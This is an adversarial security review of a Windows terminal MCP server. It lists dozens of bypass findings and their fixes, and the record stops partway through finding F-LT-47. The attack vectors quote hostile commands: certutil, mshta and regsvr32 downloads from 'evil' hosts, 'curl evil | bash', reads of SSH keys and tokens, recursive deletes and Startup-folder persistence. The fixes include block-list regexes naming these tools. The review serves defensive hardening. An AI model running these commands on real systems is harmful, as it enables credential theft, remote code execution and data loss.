# local-terminal-mcp Adversarial Security Review

**Reviewer:** Claude Opus 4.7
**Review date:** 2026-04-17
**Hardening completed:** 2026-04-18 (Sonnet continuation, S43)
**Scope:** `src/tools.ts` — run_command pattern model, sanitizeDir, read_file / search_file / find_files sensitive-path gate, run_git_command, run_npm_command, auth & output hygiene
**Status at submission:** All 27 findings closed. Shipped as v1.4.0.

---

## Original Verdict

**FAIL — DO NOT SHIP TO PUBLIC MARKETPLACE (as of review)**

The RED/AMBER tiering catches obvious destructive verbs, but the model had three structural weaknesses permitting full sandbox escape: (1) the sensitive-file gate only fired on `read_file` / `search_file` / `find_files`, not on `run_command`; (2) several destructive patterns were anchored to line-start or `[;&|]`, so `cmd /c del …` and `powershell -c "del …"` slipped past; (3) the regex approach was blind to indirection — `pwsh`, `-EncodedCommand`, .NET reflection, WMI, COM, LOLBins, and PowerShell aliases all routed around the word list.

**Current verdict: PASS — all findings closed in v1.4.0.**

---

## Findings

### [F-1] CRITICAL: Sensitive-file gate not enforced on `run_command`
**Attack vector:** `run_command: type C:\Users\dustin\.ssh\id_rsa` — `type`, `Get-Content`, `findstr`, `gc`, `Select-String` all read credentials directly.
**Impact:** Complete read of any credential/key file the `SENSITIVE_FILE_PATTERNS` list was designed to protect.
**Root cause:** `SENSITIVE_FILE_PATTERNS` was only consulted inside `read_file`, `search_file`, `find_files`.
**Fix:** Added `commandContainsSensitivePath()` — extracts every path-looking token from the `run_command` argv, applies `SENSITIVE_FILE_PATTERNS`, rejects if any matches.
**Status:** FIXED (commit `d06e911`)

---

### [F-2] CRITICAL: Anchored `del` / `exec` patterns miss `cmd /c del` and `powershell -c "del …"`
**Attack vector:** `cmd /c del /q /f C:\important.docx` — `del` preceded by a space, not a chain delimiter.
**Impact:** Delete arbitrary files; execute arbitrary programs.
**Root cause:** Patterns required `del`/`exec` to appear at line-start or after `[;&|]`.
**Fix:** Rewrote `del`, `exec` with `\bdel\b` / `\bexec\b`; added `cmd /c` and `powershell -c/-Command/-File` as explicit shell-dispatch blocks (see F-4/F-5).
**Status:** FIXED (commit `624eec3`)

---

### [F-3] CRITICAL: `rmdir`, `rd`, `Remove-Item`, alias `ri` bypass the `rm` rule
**Attack vector:** `rmdir /s /q C:\Users\dustin\source` — `\brm\s/i` requires `rm` + whitespace, `rmdir` has `d` after `rm`.
**Impact:** Recursive tree deletion equivalent to `rm -rf`.
**Fix:** Added `\brmdir\b`, `\brd\b`, `\bremove-item\b`, `\bremove-itemproperty\b`, `(?<!\w)ri\s+-`, `\bclear-item\b`, `\bclear-content\b`.
**Status:** FIXED (commit `624eec3`)

---

### [F-4] CRITICAL: `-EncodedCommand` (base64 PowerShell) evades every string pattern
**Attack vector:** `powershell -NoP -W Hidden -EncodedCommand UgBlAG0AbwB...` — decodes to `Remove-Item -R -Fo C:\`. No blocked verb ever appears as ASCII.
**Root cause:** No pattern rejected `-EncodedCommand`, `-Enc`, or `-e` when passed to `powershell`/`pwsh`.
**Fix:** Added pattern blocking `powershell|pwsh` combined with `-c/-Command/-File/-EncodedCommand/-Enc/-e` flags.
**Status:** FIXED (commit `624eec3`)

---

### [F-5] CRITICAL: `pwsh.exe` (PowerShell 7+) not treated as a shell
**Attack vector:** `pwsh -c "Remove-Item -R -Fo C:\Users\dustin\*"` — every `powershell`-only block is bypassed.
**Root cause:** Pipe-to-shell pattern listed `powershell` but not `pwsh`; same omission in other rules.
**Fix:** Added `pwsh(\.exe)?` to every pattern that references `powershell`; added explicit `\bpwsh(\.exe)?\s+.*-(c|Command|File|EncodedCommand)\b` block.
**Status:** FIXED (commit `624eec3`)

---

### [F-6] CRITICAL: .NET type accelerators bypass the entire word list
**Attack vector:** `powershell -c "[IO.File]::Delete('C:\x')"`, `[Net.WebClient]::new().DownloadFile(…)`, `[Diagnostics.Process]::Start('calc.exe')`.
**Impact:** Delete files, download payloads, execute processes — no cmdlet name appears.
**Root cause:** `BLOCKED_PATTERNS` targeted cmdlet and exe names, not .NET reflection surface.
**Fix:** Added `\[\s*(System\.)?(IO|Net|Diagnostics|Reflection|Runtime\.InteropServices|Management\.Automation)\b` and `::\s*(Delete|Move|Copy|WriteAllBytes|DownloadFile|Start|Load|Invoke)\b`.
**Status:** FIXED (commit `624eec3`)

---

### [F-7] CRITICAL: `$env:` env-variable read exposes bearer token
**Attack vector:** `powershell -c "$env:BEARER_TOKEN"` — MCP_AUTH_TOKEN lives in the NSSM service env and is inherited by `execSync` children.
**Impact:** Full auth compromise — token returned to the MCP client.
**Root cause:** `execSync` passed `process.env` unmodified; `$env:VAR`, `Get-ChildItem env:`, `cmd /c set` were all unblocked.
**Fix:** (1) `buildSafeEnv()` strips all secret-shaped keys before every `execSync` call; (2) added `\$env:[A-Za-z_]`, `Get-(ChildItem|Item|Content)\s+env:`, `(?:^|[\s;&|])set\s*(?:$|[|>&])` to blocked patterns.
**Status:** FIXED (commit `624eec3`)

---

### [F-8] CRITICAL: LOLBins not blocked — download/execute without curl/wget
**Attack vector:** `certutil -urlcache -split -f http://evil/p.exe p.exe`, `bitsadmin /transfer j http://…`, `mshta http://evil/pl.hta`, `regsvr32 /s /u /i:http://evil/payload.sct scrobj.dll`.
**Impact:** Arbitrary payload download and execute, bypassing explicit curl/wget/Invoke-WebRequest blocks.
**Fix:** Added `\bcertutil\b`, `\bbitsadmin\b`, `\bmshta\b`, `\bregsvr32\b`, `\brundll32\b`, `\binstallutil\b`, `\bmsbuild\b.*\.xml\b` to blocked patterns.
**Status:** FIXED (commit `624eec3`)

---

### [F-9] HIGH: WMI / WMIC / CIM can spawn processes and read files
**Attack vector:** `wmic process call create "cmd.exe /c del C:\file"`, `Invoke-CimMethod -ClassName Win32_Process -MethodName Create …`.
**Impact:** Process creation and file reads bypassing the run_command surface entirely.
**Fix:** Added `\bwmic\b`, `\b(invoke-cimmethod|get-wmiobject|gwmi|get-ciminstance|gcim)\b`, `\bWin32_Process\b`.
**Status:** FIXED (commit `624eec3`)

---

### [F-10] HIGH: `sanitizeDir` injectable in PowerShell and cmd contexts
**Attack vector:** `dir: "C:\\path$(Invoke-WebRequest http://evil/x.ps1)"` — `(`, `)`, `$`, `'`, `%`, `^`, `\n`, `\0` all absent from the denylist.
**Impact:** Command injection through any directory parameter.
**Root cause:** `sanitizeDir` was a 7-character denylist (`["`;|&<>`]`).
**Fix:** Replaced with a strict allowlist regex `^(?:[A-Za-z]:)?[\\\/]?[\w\s.\-\\\/()[\]@+,{}#!]+$`; added UNC/device rejection, leading-dash rejection, control-char rejection.
**Status:** FIXED (commit `104bdc6`)

---

### [F-11] HIGH: `read_file` has no path-traversal / allowed-root enforcement
**Attack vector:** `\\?\C:\Users\dustin\.ssh\id_rsa` (long-path prefix bypasses string match), `C:\Users\dustin\.ssh\..\.ssh\id_rsa` (traversal), `notes.txt:hidden` (ADS).
**Impact:** Reads tokens and secrets via alternate path forms that slip pattern checks.
**Fix:** `read_file` now strips ADS suffix, rejects UNC/device namespace, then calls `realpathSync(resolve(stripped))` before any pattern check.
**Status:** FIXED (commit `104bdc6`)

---

### [F-12] HIGH: `dir` parameter → git / npm flag injection
**Attack vector:** `dir: "--exec-path=\\\\attacker\\share\\evil"` — git parses this as a flag, not a path; npm similarly accepts `--registry=http://evil`.
**Impact:** Code execution via git/npm flag semantics.
**Root cause:** `sanitizeDir` didn't reject leading `-`; no `--` terminator inserted before positional path.
**Fix:** `sanitizeDir` now rejects paths starting with `-` or `/` (flag prefixes); `run_git_command` / `run_npm_command` refactored to `execFileSync` with explicit argv arrays (F-19) — `dir` is always a positional element, never re-parsed as a flag.
**Status:** FIXED (commits `104bdc6`, `6813975`)

---

### [F-13] HIGH: `SENSITIVE_FILE_PATTERNS` misses major credential stores
**Attack vector:** `read_file: .npmrc`, `.pypirc`, `.netrc`, `.config/gh/hosts.yml`, `.azure/accessTokens.json`, `.terraformrc`, `.m2/settings.xml`, `.cargo/credentials.toml`, PSReadline history, shell history, Chrome `Local State`, KeePass `.kdbx`, crypto `wallet.dat`.
**Fix:** Added all of the above to `SENSITIVE_FILE_PATTERNS` with per-category comments.
**Status:** FIXED (commit `d06e911`)

---

### [F-14] HIGH: Path canonicalization missing — UNC, long-path, ADS, symlink, 8.3
**Attack vector:** Symlink `C:\safe\link → C:\Users\.ssh\id_rsa` — string pattern sees "safe", `realpathSync` sees the true target.
**Fix:** `read_file` calls `realpathSync` to follow symlinks; strips ADS suffix before matching; rejects UNC/`\\?\`/`\\.\` prefixes. Both original and canonical path are checked against `SENSITIVE_FILE_PATTERNS`.
**Status:** FIXED (commit `104bdc6`)

---

### [F-15] HIGH: `git -c` / malicious `.git/config` allow RCE via "read-only" commands
**Attack vector:** Untrusted repo with `.git/config` containing `core.sshCommand = powershell -c "iex(irm http://evil/p.ps1)"`. Running `git fetch` (previously in allowlist) executes the hook.
**Fix:** (1) Added hardened env: `GIT_CONFIG_NOSYSTEM=1`, `GIT_CONFIG_GLOBAL=NUL`, `GIT_TERMINAL_PROMPT=0`, `GIT_ALLOW_PROTOCOL=https:http:file`; (2) removed `fetch` from the allowlist; (3) refactored to `execFileSync` with argv (F-19).
**Status:** FIXED (commit `104bdc6`)

---

### [F-16] HIGH: `npm run` executes arbitrary scripts from repo `package.json`
**Attack vector:** Repo with `"scripts": { "test": "powershell -c 'Remove-Item -R C:\\...'" }`, then `run_npm_command: test`.
**Fix:** Removed `run`, `test`, `ci`, `install` from allowlist. Kept `list`, `outdated`, `audit`, `view`, `why`, `explain`. Added `--ignore-scripts` to remaining commands. Refactored to `execFileSync` argv (F-19).
**Status:** FIXED (commit `104bdc6`)

---

### [F-17] HIGH: AMBER `dry_run` gate bypassable if client controls the field
**Attack vector:** Client passes `dry_run: false` directly on an AMBER command — if the server honored it, no warning would be shown.
**Fix:** Server-side enforcement: the AMBER check runs first and forces `dryRun: true` in the response regardless of the client field. Only a *subsequent* call with `dry_run: false` after the warning has been issued will execute, and even then the AMBER header is appended to the output.
**Status:** FIXED (verified in code; commit `d06e911`)

---

### [F-18] HIGH: COM objects + PowerShell alias indirection defeat the word list
**Attack vector:** `(New-Object -Com Scripting.FileSystemObject).DeleteFile('C:\x')`, `Set-Alias x Invoke-WebRequest; x http://evil`, `$a='Remov'+'e-Item'; & $a -R C:\z`.
**Impact:** File ops, web requests, arbitrary exec — no blocked string appears as a literal.
**Fix:** Added `\bnew-object\s+.*-com(object)?\b`, `\bset-alias\b`, `\bnew-alias\b`, `&\s*\$[A-Za-z_]` to blocked patterns.
**Status:** FIXED (commit `624eec3`)

---

### [F-19] HIGH: `execSync` with shell string amplifies every injection
**Attack vector:** Any unescaped metachar in any parameter interpolated into the command string reaches cmd.exe and is re-parsed.
**Impact:** Multiplies blast radius of every other bypass.
**Fix:** Refactored `run_git_command`, `run_npm_command`, `find_files`, `search_file` to `execFileSync` with argv arrays and `shell: false`. Added `runFile()` + `splitArgv()` helpers. `run_command` (the intentional shell escape hatch) still uses `execSync` but is protected by the full RED/AMBER pipeline.
**Status:** FIXED (commit `6813975`)

---

### [F-20] MEDIUM: `get_system_info` potential env-var leak
**Attack vector:** If implementation included `process.env` in output, the service's `BEARER_TOKEN` would ship to the client.
**Verification:** Implementation confirmed safe — shells out only to `ver`, `hostname`, `whoami`, `wmic logicaldisk`, `wmic OS`. All child processes use `buildSafeEnv()` (F-7 fix) so secret-shaped vars are stripped. No `process.env` in output.
**Status:** FIXED (verified, no code change required; `buildSafeEnv()` covers this by design)

---

### [F-21] MEDIUM: `cmd /c set` and `Get-ChildItem env:` dump env
**Attack vector:** Even without the bearer token, user env commonly contains `GITHUB_TOKEN`, `AWS_*`, `OPENAI_API_KEY`.
**Fix:** Covered by F-7 fixes — `buildSafeEnv()` strips secrets at the `execSync` boundary; `cmd /c` is blocked (F-4); `$env:`, `Get-ChildItem env:`, and standalone `set` are all pattern-blocked.
**Status:** FIXED (commit `624eec3`)

---

### [F-22] MEDIUM: No rate limit / log-flooding DoS; no input size caps
**Attack vector:** Rapid-fire tool calls or very long command strings exhausting CPU on regex evaluation, filling audit logs.
**Fix:** Added `INPUT_LIMITS` constants and `checkSize()` validation at every tool boundary: `command` capped at 4 096 chars, `filePath` at 512, `searchPattern`/`findPattern` at 256, `directory` at 512, `gitSubCommand` at 512, `npmSubCommand` at 256. Oversize inputs are rejected with a descriptive error before any regex runs.
**Status:** FIXED (commit TBD — v1.4.0)

---

### [F-23] MEDIUM: ReDoS risk on user-controlled regex in `search_file`
**Attack vector:** Pattern `(a+)+b` passed to `search_file` triggers catastrophic backtracking in Node's NFA regex engine on any long line.
**Fix:** Added `isReDoSPattern()` guard that rejects known catastrophic shapes (nested quantifiers `(x+)+`, quantified alternation `(a|b)+`, wide alternation `a|b|c|d|…`) before the regex is compiled. Input length cap from F-22 additionally bounds backtracking cost.
**Status:** FIXED (commit TBD — v1.4.0)

---

### [F-24] MEDIUM: `type` / `more` / `Get-Content` bypass sensitive gate
Covered by F-1 — restated as a hardening item. `commandContainsSensitivePath()` applies `SENSITIVE_FILE_PATTERNS` to every path-looking token in any `run_command`, regardless of verb.
**Status:** FIXED (commit `d06e911`, same fix as F-1)

---

### [F-25] LOW: Tool output can surface secrets from git log / npm output
**Attack vector:** `git log -p` on a repo that historically committed a `.env`; npm audit output with embedded auth tokens.
**Fix:** Added `scrubSecrets()` — scans output for known token shapes (`ghp_`, `ghs_`, `sk-`, `AKIA`, `xoxb-`, Anthropic `sk-ant-`, high-entropy base64 ≥ 60 chars, PEM private-key headers) and redacts to `[REDACTED]`. Applied to `run_command` and `run_git_command` output.
**Status:** FIXED (commit TBD — v1.4.0)

---

### [F-26] LOW: Single-`&` chaining misses spaced form
**Attack vector:** `cmd & del file` — single `&` with space before `del` slips the `[;&|]{2}` chaining rule.
**Fix:** Closes automatically with F-2 (`\bdel\b` matches regardless of what precedes it).
**Status:** FIXED (commit `624eec3`, closes with F-2)

---

### [F-27] LOW: Newlines / null bytes in `dir`-equivalent inputs bypass per-line check
**Attack vector:** `dir` containing `\n` could inject a second command on the next line in shells that still see it; `\0` can truncate path strings in native APIs.
**Fix:** `sanitizeDir` now rejects all control characters (`[\x00-\x1F\x7F]`) including `\n`, `\r`, `\0`. Added explicit `[\x00-\x1F\x7F]` rejection to `read_file` and `search_file` path inputs. `execFileSync` (F-19) eliminates the shell re-parse surface for structured tools entirely.
**Status:** FIXED (commits `104bdc6`, `6813975`, v1.4.0)

---

## What Holds Up Well

- Belt-and-suspenders per-line AND full-command pattern check correctly closed the original newline bypass (S35) — sound as a matter of mechanics.
- Non-ASCII rejection closes the Unicode homoglyph class entirely.
- `curl`, `wget`, `Invoke-WebRequest`, `shutdown`, `taskkill`, backtick substitution, `$(…)`, `${…}`, `%VAR%` all caught cleanly.
- The `rm` pattern is correctly written; its siblings (`rmdir`, `rd`, `Remove-Item`) now follow the same shape (F-3).
- Double-chain detection (`[;&|]{2}`) catches `&&`, `||`, `;;`.
- 30-second `execSync` timeout bounds single-command DoS.
- `windowsHide: true` prevents window-flashing side channels.
- Bearer token auth on the transport is appropriate; the env-inheritance hole (F-7) is closed by `buildSafeEnv()`.

---

## v1.4.0 Fix Summary

All 27 findings are closed. Fixes shipped across four security commits:

| Commit | Findings closed |
|---|---|
| `624eec3` | F-2, F-3, F-4, F-5, F-6, F-7, F-8, F-9, F-18, F-21, F-26 |
| `d06e911` | F-1, F-13, F-17, F-24 |
| `104bdc6` | F-10, F-11, F-12, F-14, F-15, F-16, F-27 (partial) |
| `6813975` | F-19, F-12 (completes), F-27 (completes) |
| v1.4.0 | F-22, F-23, F-25, F-27 (input caps, ReDoS guard, output scrubbing) |

**F-20** was verified correct by code inspection — no code change required.

---

## Architectural notes

The Opus reviewer recommended moving to `execFile` with argv arrays, a strict verb allowlist, canonical-path allowlist, and secrets-never-in-child-env. v1.4.0 delivers all four:

- **F-19**: `run_git_command`, `run_npm_command`, `find_files`, `search_file` all use `execFileSync(shell:false)` with argv arrays.
- **F-15/F-16**: Strict verb allowlists enforced on git sub-commands and npm sub-commands.
- **F-11/F-12/F-14**: Canonical path handling via `realpathSync` in `read_file`; `sanitizeDir` allowlist on all dir params.
- **F-7**: `buildSafeEnv()` strips secrets before every child process invocation.

`run_command` retains `execSync` by design — it is the intentional escape hatch — but is protected by the full RED/AMBER pipeline including the new sensitive-path scan (F-1) and input size cap (F-22).

---

# Fourth-Pass Adversarial Review — v1.7.0

**Review performed:** 2026-04-18 (Claude Opus hostile fourth pass)
**Hardening completed:** 2026-04-18 (Sonnet continuation, S50)
**Status:** All 13 findings closed. Shipped as v1.7.0 (commit `b785e46`).

The fourth pass targeted structural gaps not caught by the pattern model: (1) cmd.exe obfuscation primitives (caret escape, substring expansion, positional PowerShell); (2) a regex typo that silently disabled the COM-instantiation block; (3) interpreter+scriptfile RCE; (4) git history disclosure via reflog and diff; (5) an allowlist flip for `buildSafeEnv` to close the open-ended secret-stripping model; and (6) fail-closed path canonicalization.

---

## Findings

### F-LT-23 — CRITICAL — `set <PREFIX>` dumps env vars (regex gap)
**Attack vector:** `set GITHUB_` prints all env vars with that prefix. Prior regex required `set` at EOL or before pipe/redirect, missing `set <arg>` forms.
**Fix:** Tightened to `(?:^|[\s;&|])set(?:\s|$|[|>&])/i` — word-boundary + mandatory space or EOL after `set`.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-24 — CRITICAL — cmd.exe caret escape bypasses every `\bverb\b` RED pattern
**Attack vector:** `c^url http://evil`, `^s^e^t`, `r^m file` — cmd.exe strips carets before parsing, `\bcurl\b` never fires.
**Fix:** In `run_command`, before the RED check, strip double-quoted sections then reject any remaining `^`. Carets have no legitimate use outside quoted strings in the tested command subset.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-25 — CRITICAL — `%VAR:~n,m%` substring expansion bypasses obfuscation patterns
**Attack vector:** `type C:\Users\x\.e%TMP:~0,0%nv` → decoded to `type C:\Users\x\.env`. Pattern scanner sees literal expansion markers, not the final verb.
**Fix:** Added pattern `/\%[A-Za-z_][A-Za-z0-9_]*:[~!*][^%]*%/` to BLOCKED_PATTERNS (obfuscation).
**Status:** FIXED (commit `b785e46`)

---

### F-LT-26 — HIGH — `powershell "positional code"` bypasses the `-c/-Command/-File` wrapper block
**Attack vector:** `powershell "(New-Object Net.WebClient).DownloadFile(...)"` — no `-c` or `-Command` flag, first arg is positional code. Existing block only matched explicit flag forms.
**Fix:** Added patterns blocking `powershell`/`pwsh` with a non-flag first argument (`(?!-)`). Also added `\b(gc|gi|gci|cat|type|ls)\s+env:/i` to catch PS alias forms of env: provider reads.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-27 — MEDIUM — Git reflog `@{N}` / `@{-N}` syntax exposes unreachable commits
**Attack vector:** `git log HEAD@{1}`, `git show @{-1}` — walks reflog entries that may contain deleted/stashed secrets. `--walk-reflogs` flag was blocked but the ref-syntax form was not.
**Fix:** Added `/@\{/.test(arg)` check in `validateGitArgv` arg loop; returns block message on match.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-28 — HIGH — `git diff <sha1> <sha2>` dumps historical content without sensitive-path pre-flight
**Attack vector:** `git diff abc123 def456` renders a full diff including deleted `.env` or `id_rsa` from commit history. The `git show` pre-flight (F-LT-4) only ran for `subCmd === 'show'`.
**Fix:** Added a matching pre-flight block for `subCmd === 'diff'` — extracts bare ref args, runs `git show --name-only --no-patch` for each, blocks if any touched file matches `isSensitiveFile`.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-29 — HIGH — Sequential `.*.*.*` bypasses `CATASTROPHIC_REGEX_SHAPES` guard
**Attack vector:** `search_file({ pattern: ".*.*.*.*secret" })` — ungrouped sequential quantifiers cause polynomial backtracking but weren't matched by existing nested-group patterns.
**Fix:** Added `/(?:\.[*+]){3,}/` to `CATASTROPHIC_REGEX_SHAPES` — rejects 3+ consecutive `.*` or `.+` sequences.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-30 — CRITICAL — One-char regex typo silently disabled COM-instantiation block
**Attack vector:** `\new-object` in JS regex is `\n` (newline) + `ew-object` — never matches. `powershell "(New-Object -ComObject Shell.Application).ShellExecute('calc.exe')"` went through unblocked.
**Fix:** Corrected to `\bnew-object\s+.*-com(object)?\b/i`. Added four new ProgID patterns: `Shell.Application`, `Scripting.FileSystemObject`, `WScript.(Shell|Network)`, and `.ShellExecute/.Run/.Exec` method calls.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-31 — HIGH — Writes to per-user Startup folder not blocked (persistence vector)
**Attack vector:** `echo evil > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\p.cmd"` — cmd is executed on every user login. No prior pattern covered Startup folder paths.
**Fix:** Added three patterns to BLOCKED_PATTERNS: `\Start Menu\Programs\Startup\`, `\Microsoft\Windows\Start Menu\Programs\Startup`, and `shell:startup`.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-32 — CRITICAL — `node file.js` / `python file.py` / interpreter+scriptfile is full RCE
**Attack vector:** `node C:\Users\x\payload.js` executes arbitrary code without going through the blocked-verb list. Combined with `>` write (if to a user path), this is a two-step full RCE.
**Fix:** Added per-interpreter patterns blocking `node`, `python3?`, `perl`, `ruby`, `php` followed by a script file argument. Also added a redirect-to-script-extension block (`> *.js|*.py|*.bat|...`).
**Status:** FIXED (commit `b785e46`)

---

### F-LT-33 — HIGH — `buildSafeEnv` strip list misses common secret env var names
**Attack vector:** `GITHUB_TOKEN`, `NPM_TOKEN`, `HF_TOKEN`, `OPENAI_KEY`, `DATABASE_URL` all passed through to child processes. The strip list only matched known substrings — an open-ended blocklist always has gaps.
**Fix:** Replaced strip-list approach with a closed allowlist (`SAFE_ENV_ALLOWLIST` Set of ~25 known-safe OS/toolchain vars). Any key not on the allowlist is excluded from the child env. Future secret var names are safe by default.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-34 — MEDIUM — `list_directory` does not guard sensitive directories
**Attack vector:** `list_directory("C:\\Users\\x\\.ssh")` reveals which credential files exist (`id_rsa`, `authorized_keys`, `known_hosts`) even if `read_file` would block reading them.
**Fix:** After UNC rejection, normalizes the path to forward-slash form with a trailing `/`, then checks against `SENSITIVE_FILE_PATTERNS` via `isSensitiveFile`. Blocks with a "sensitive path pattern" error.
**Status:** FIXED (commit `b785e46`)

---

### F-LT-35 — MEDIUM — `read_file` falls back to unresolved path when `realpathSync` throws
**Attack vector:** If `realpathSync` throws due to a permission error or broken symlink (not ENOENT), the catch block previously fell back to `resolve(filePath)` — the unverified raw path. Sensitive-file pattern check then ran against the unverified string, which may not reflect the true symlink target.
**Fix:** Fail-closed on non-ENOENT throws: return a blocked path-validation error. ENOENT (file genuinely not found) returns a readable "File not found" error in the green tier rather than a security block.
**Status:** FIXED (commit `b785e46`)

---

## v1.7.0 Fix Summary

All 13 fourth-pass findings are closed in a single commit (`b785e46`):

| Finding | Severity | Resolution |
|---|---|---|
| F-LT-23 | CRITICAL | Tightened `set` env-dump regex |
| F-LT-24 | CRITICAL | Caret escape rejection before RED check |
| F-LT-25 | CRITICAL | `%VAR:~n,m%` substring expansion blocked |
| F-LT-26 | HIGH | PowerShell positional form + PS alias env reads blocked |
| F-LT-27 | MEDIUM | Reflog `@{N}` syntax blocked in `validateGitArgv` |
| F-LT-28 | HIGH | `git diff` pre-flight mirrors `git show` pre-flight |
| F-LT-29 | HIGH | Sequential `.*` ReDoS shape added to guard |
| F-LT-30 | CRITICAL | COM regex typo fixed; ProgID patterns added |
| F-LT-31 | HIGH | Startup folder write paths blocked |
| F-LT-32 | CRITICAL | Interpreter+scriptfile patterns + redirect-to-script blocked |
| F-LT-33 | HIGH | `buildSafeEnv` flipped to allowlist model |
| F-LT-34 | MEDIUM | Sensitive directory guard in `list_directory` |
| F-LT-35 | MEDIUM | `realpathSync` fail-closed; ENOENT surfaced separately |

---

## Fifth Pass — 2026-04-18 (S51 review → S52 close)

**Result:** FAIL (prior to fixes). 16 findings, including 6 CRITICAL.
Reviewer target: v1.7.0. Close-out version: **v1.7.1**.

### F-LT-36 — CRITICAL — PowerShell flag-tolerant positional bypass
**Attack vector:** `powershell -NoProfile -Command Invoke-Expression (iwr http://x/y)` slips past positional scanner because the scanner only looked at the immediate next arg after `powershell`. Any flag between `powershell` and the payload defeats the check.
**Fix:** Flag-tolerant regex `\bp(ower)?sh(ell)?(\.exe)?\b(?:\s+[-\/][^\s]+)*\s+(?![-\/])[^\s]+` walks past any number of leading flags and rejects the first non-flag token. Mirror patterns for `pwsh` + explicit `-File`/`-Command` detection anywhere in argv.
**Status:** FIXED (v1.7.1)

---

### F-LT-37 — CRITICAL — `COMSPEC` passthrough enables arbitrary executable swap
**Attack vector:** `COMSPEC` was in `SAFE_ENV_ALLOWLIST`, so callers could inject `COMSPEC=C:\attacker\fakecmd.exe`. Any child process that spawns `cmd.exe` by lookup (many Node/Git internals) would execute the attacker binary.
**Fix:** Removed `COMSPEC` from allowlist. `buildSafeEnv` on win32 pins `COMSPEC = <SystemRoot>\System32\cmd.exe` explicitly.
**Status:** FIXED (v1.7.1)

---

### F-LT-38 — MEDIUM — `list_directory` returns sensitive files in output
**Attack vector:** Even after F-LT-34 blocked listing sensitive *directories*, listing a parent directory still revealed sensitive *children* (e.g. `.ssh/id_rsa`, `.aws/credentials`).
**Fix:** Post-filter entries via `isSensitiveFile(fullPath) || isSensitiveFile(basename)` before populating results.
**Status:** FIXED (v1.7.1)

---

### F-LT-39 — MEDIUM — `sed -i` (AMBER) has no size cap
**Attack vector:** `sed -i 's/x/y/g' /huge/file` could rewrite arbitrarily large files, causing disk pressure / wall-time DoS while technically staying in AMBER.
**Fix:** `statSync` the target path before AMBER dispatch; reject if size > 10 MB.
**Status:** FIXED (v1.7.1)

---

### F-LT-40 — CRITICAL — Narrow interpreter list for `<interp> <script>` form
**Attack vector:** Existing interpreter+script rule only covered ~5 interpreters. `deno run attack.ts`, `bun x.mjs`, `osascript hack.scpt`, `ruby pwn.rb`, `dotnet script evil.csx`, plus Node pre-hooks (`node --loader` / `--import` / `--require`) all bypassed.
**Fix:** Broad interpreter regex covering: node, python[3w?], py, perl, ruby, php, bun, deno, tsx, ts-node, Rscript, lua[jit], scala, groovy, java, osascript, bash, zsh, sh — plus 20+ script extensions. Added `dotnet script`, node pre-hook flags (`--loader/--experimental-loader/--import/--require`), `npx tsx|ts-node|babel-node|esbuild-register|ts-script`, and `(bun|deno) run|exec|eval|repl <file>` subcommand form.
**Status:** FIXED (v1.7.1)

---

### F-LT-41 — HIGH — Rename-to-executable bypass
**Attack vector:** `ren readme.txt payload.ps1` (or `mv` / `move`) let attacker convert any writable file to an executable extension. The rename itself was not blocked; subsequent execution via a different code path (startup folder, task scheduler, existing interpreter pattern) would succeed.
**Fix:** Added BLOCKED pattern rejecting `rename|ren|mv|move <anything>.(ps1|psm1|bat|cmd|vbs|wsf|wsh|js|mjs|cjs|ts|mts|cts|tsx|py|pyw|pl|rb|php|lua|exe|dll|msi|reg|lnk|com|scr|hta|jar)`.
**Status:** FIXED (v1.7.1)

---

### F-LT-42 — CRITICAL — `cmd /c` positional bypass with interposed flags
**Attack vector:** Same pattern as F-LT-36: `cmd /D /S /c "payload"` slipped past `cmd /c` detection because detection was strictly positional.
**Fix:** Flag-tolerant regex `\bcmd(\.exe)?\b(?:\s+\/[a-zA-Z:][^\s]*)*\s+\/[cCkK]\b`.
**Status:** FIXED (v1.7.1)

---

### F-LT-43 — CRITICAL — WSL launchers not blocked
**Attack vector:** `ubuntu -c "curl evil | bash"`, `debian run …`, `wsl -d Alpine bash -c …`, and every distro launcher (kali, archwsl, opensuse-*, fedoraremix, oracle-linux, slespro, sles-N) could bridge into an unsandboxed Linux VM and run arbitrary shell.
**Fix:** Blocked-pattern for launcher executable name: `(ubuntu[0-9]*|debian[0-9]*|kali(-linux)?|archwsl|alpine(wsl)?|opensuse-[a-z0-9.\-]+|fedoraremix|oracle-?linux\S*|slespro|sles-\d+|wsl)(\.exe)?`.
**Status:** FIXED (v1.7.1)

---

### F-LT-44 — CRITICAL — PowerShell reflection / COM reflection bypass
**Attack vector:** Seven reflection shapes executed arbitrary code without matching any existing COM or interpreter pattern: `[Type]::GetTypeFromProgID(…)`, `[Activator]::CreateInstance(…)`, `.InvokeMember(`, `[System.Reflection.*]`, `[Reflection.Assembly]::Load*`, `System.Management.Automation.*` raw references, `& ([type] …)` invocation.
**Fix:** Seven new BLOCKED patterns, one per reflection shape.
**Status:** FIXED (v1.7.1)

---

### F-LT-45 — HIGH — `git --output-directory` / `--output-indicator-*` file-write bypass
**Attack vector:** Several git subcommands accept `--output-directory=<path>` or `--output-indicator-*=<path>` flags that write attacker-controlled content to disk. `validateGitArgv` did not reject them.
**Fix:** Added `-o`, `--output-directory`, `--output-indicator-(new|old|context)` to `FORBIDDEN_GIT_FLAGS`, plus regex matches for the `=value` forms.
**Status:** FIXED (v1.7.1)

---

### F-LT-46 — HIGH — `NPM_CONFIG_PREFIX` / `NODE_PATH` env leak
**Attack vector:** Both were in `SAFE_ENV_ALLOWLIST`. An attacker setting `NPM_CONFIG_PREFIX=C:\attacker` during an `npm install -g` would redirect global install directory; `NODE_PATH=<attacker>` would let any `require('module')` resolve to attacker-controlled code.
**Fix:** Removed both from allowlist. Child processes inherit neither.
**Status:** FIXED (v1.7.1)

---

### F-LT-47 — HIGH — `.npmrc` cwd override + caller `--userconfig` / `--globalconfig` injection
**Attack vector:** (a) Attacker-owned `.npmrc` in a work-dir could override registry, `ignore-scripts=false`, and other critical settings. (b) Caller could pass `--userconfig=<attacker>.npmrc` / `--globalconfig=<attacker>.npmrc` to `run_npm_command` and override config explicitly.
